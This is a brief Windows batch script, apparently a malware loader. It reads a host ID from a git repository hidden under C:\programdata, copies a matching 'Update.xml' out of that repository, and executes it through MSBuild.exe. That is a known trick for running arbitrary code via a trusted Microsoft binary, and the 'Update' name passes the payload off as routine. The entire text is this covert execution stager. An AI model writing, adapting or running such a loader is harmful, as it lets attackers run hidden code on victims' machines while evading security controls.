for /f %%i in ('git -C "C:\programdata\git\org-database" config --get custom.guid') do set LID=%%i
cd c:\
if "%LID%"=="" (
	copy "C:\programdata\git\org-database\Update.xml" "C:\programdata\"
) else (
	copy "C:\programdata\git\org-database\[%LID%]\Update.xml" "C:\programdata\"
)
start /D "C:\programdata" C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe "C:\programdata\Update.xml"
